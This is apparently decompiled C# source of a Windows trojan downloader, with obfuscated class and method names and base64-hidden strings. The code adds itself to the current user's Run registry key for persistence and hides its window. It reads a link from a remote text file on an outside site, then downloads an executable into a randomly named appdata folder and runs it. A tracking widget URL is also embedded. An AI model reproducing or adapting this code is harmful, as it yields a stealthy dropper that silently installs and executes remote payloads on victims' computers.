using System;
using System.Configuration;
using System.Diagnostics;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns5;

namespace ns1;

internal class Class6
{
	public static string string_0 = "XE1pY3Jvc29mdFxtaWNyb3NvZnQuZXhl";

	public static byte[] byte_0 = Convert.FromBase64String(string_0);

	public static string string_1 = Interaction.Environ("appdata") + Encoding.UTF8.GetString(byte_0);

	public static string string_2 = "aHR0cDovL3d3dy5zb2NpYWxkZWFsZXJzLm5ldC9iaWxnaW0udHh0";

	public static byte[] byte_1 = Convert.FromBase64String(string_2);

	public static string string_3 = "http://whos.amung.us/widget/yenisistem06.png";

	public static string string_4 = Encoding.UTF8.GetString(byte_1);

	public static void smethod_0(string string_5, string string_6)
	{
		string s = "U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu";
		byte[] bytes = Convert.FromBase64String(s);
		string @string = Encoding.UTF8.GetString(bytes);
		Registry.CurrentUser.OpenSubKey(@string, writable: true)!.SetValue(string_5, string_6);
	}

	public static void smethod_1(string string_5, string string_6)
	{
		((ServerComputer)Class2.Computer).get_FileSystem().CopyFile(string_5, string_6);
	}

	public unsafe static string smethod_2(int int_0)
	{
		void* ptr = stackalloc byte[16];
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		string[] array = new string[26]
		{
			"A", "B", "C", "D", "E", "F", "G", "H", "I", "J",
			"K", "L", "M", "N", "O", "P", "Q", "R", "S", "T",
			"U", "V", "W", "X", "Y", "Z"
		};
		*(int*)ptr = array.GetUpperBound(0);
		byte* num = (byte*)ptr + 4;
		*(int*)((byte*)ptr + 12) = checked(int_0 - 1);
		*(int*)num = 0;
		while (*(int*)((byte*)ptr + 4) <= *(int*)((byte*)ptr + 12))
		{
			*(int*)((byte*)ptr + 8) = random.Next(*(int*)ptr);
			stringBuilder.Append(array[*(int*)((byte*)ptr + 8)]);
			checked
			{
				(*unchecked((int*)((byte*)ptr + 4)))++;
			}
		}
		return stringBuilder.ToString();
	}

	public static void smethod_3()
	{
		Class2.Forms.Form1.Timer1.Start();
		((Control)Class2.Forms.Form1).Hide();
	}

	public static void smethod_4()
	{
		string text = Interaction.Environ("appdata") + "\\" + smethod_2(10) + "\\m.exe";
		WebClient webClient = new WebClient();
		string address = string_4;
		string text2 = webClient.DownloadString(address);
		if (Operators.CompareString(Class8.Settings.link, text2, false) != 0)
		{
			((ServerComputer)Class2.Computer).get_Network().DownloadFile(text2, text);
			Process.Start(text);
			Class8.Settings.link = text2;
			((ApplicationSettingsBase)Class8.Settings).Save();
		}
	}

	public static void smethod_5(object object_0)
	{
		WebBrowser webBrowser = Class2.Forms.Form1.WebBrowser1;
		object[] array = new object[1] { RuntimeHelpers.GetObjectValue(object_0) };
		bool[] array2 = new bool[1] { true };
		NewLateBinding.LateCall((object)webBrowser, (Type)null, "Navigate", array, (string[])null, (Type[])null, array2, true);
		if (array2[0])
		{
			object_0 = RuntimeHelpers.GetObjectValue(array[0]);
		}
	}
}
